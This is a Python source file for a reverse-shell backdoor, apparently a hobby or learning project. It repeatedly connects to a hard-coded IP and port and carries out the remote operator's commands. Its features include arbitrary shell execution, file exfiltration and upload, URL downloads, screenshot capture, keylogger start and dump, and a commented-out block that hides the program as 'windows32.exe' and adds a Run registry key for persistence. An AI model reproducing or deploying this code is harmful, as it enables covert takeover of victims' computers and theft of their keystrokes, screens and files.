#!/usr/bin/python3

import socket
import subprocess as sp
import json
import os
import base64
import sys
import shutil
import requests
import time
from mss import mss
import threading

from ../keylogger import keylogger

# CHECK AGAIN DATA TYPES IN THIS SEND FUNCTION (BYTES OR STRING)
# Sending data
def reliable_send(data):
    if isinstance(data, bytes):
        json_data = json.dumps(data.decode('utf-8')) # decode from bytes to work with JSON
    else:
        json_data = json.dumps(data)

    s.send(json_data.encode('utf-8')) # encoding data to send 

# Receiving data
def reliable_recv():
    data = ""
    while True:
        try:
            data = data + s.recv(1024).decode('utf-8') # decode to concatenate string
            return json.loads(data)
        except ValueError:
            continue


# Checking for connection every x seconds. This is for when bot executes the prog but the server hasn't been set up yet!
def connection():
    while True:
        time.sleep(10)
        try:
            s.connect(("192.168.235.132", 2345))
            shell()
        except:
            connection()


# Download file from web
def download(url):
    res = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as f:
        f.write(res.content)

# Taking screeshot
def screenshot():
    with mss() as screenshot:
        screenshot.shot()

# Backbone function
def shell():
    while True:
        # command = reliable_recv().decode('utf-8') # ?need decode ???
        command = reliable_recv() # answer line 25: nope because data is already decoded in the reliable_recv function
        
        # Use b'q' because the command variable is a byte type after receiving from the server' --> Just use decode :))
        if command == 'q':
            break

        # Showing help
        elif command == 'help':
                help_opts = """
                            download <path>     --> download a file from bot
                            upload <path>       --> upload a file to bot
                            screenshot          --> take screenshot of bot
                            start <path>        --> start a program (Windows preferred)
                            keylog_start        --> start the keylogger
                            keylog_dump         --> dump the keystrokes file
                            q                   --> exit the reverse shell
                """

                reliable_send(help_opts)
        # Changing directory
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        # Server sent download means client read and send file's data
        elif command[:8] == "download":
            with open(command[9:], 'rb') as f:
                reliable_send(base64.b64encode(f.read()))

        # Server sent upload means client receives and writes data to file
        elif command[:6] == "upload":
            with open(command[7:], 'wb') as f:
                data = reliable_recv()
                f.write(base64.b64decode(data))
            
        # Download file from web
        elif command[:3] == "get":
            try:
                download(command[4:])
                reliable_send("[+] File Downloaded from URL!")
            except:
                reliable_send("[-] File Failed to Download ...")
        
        # Taking screenshot
        elif command[:10] == "screenshot":
            try: 
                screenshot()
                with open("monitor-1.png", "rb") as f:
                    reliable_send(base64.b64encode(f.read()))
                os.remove("monitor-1.png")
            except: 
                reliable_send("[-] Failed to take screenshot!")
        
        # Start a command --> Best for windows, not needed much for linux
        elif command[:5] == "start":
            try:
                sp.Popen(command[6:], shell=True)
                reliable_send("[+] Program Started!")
            except:
                reliable_send("[-] Failed To Start!")
        
        # Start the keylogger 
        elif command[:12] == "keylog_start":
            t = threading.Thread(target=keylogger.start)
            t.start()

        # Dumping the keystrokes
        elif command[:11] == "keylog_dump":
            f = open(keylog_path, 'r')
            reliable_send(f.read())
            #maybe??
            f.close()

        else:
            proc = sp.Popen(command, shell=True, stdout=sp.PIPE, stdin=sp.PIPE, stderr=sp.PIPE)
            result = proc.stdout.read() + proc.stderr.read() # Apparently the data return from proc or maybe function read() from subprocess is already returned as bytes :))

            reliable_send(result)

keylog_path = "/temp/log_key.txt"

# Code for hiding backdoor and being persistent (does not require yet!!!)
# location = os.environ["AppData"] + "\\windows32.exe"
# if not os.path.exists(location):
#   shutil.copyfile(sys.executable, location)
#   subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()
s.close()
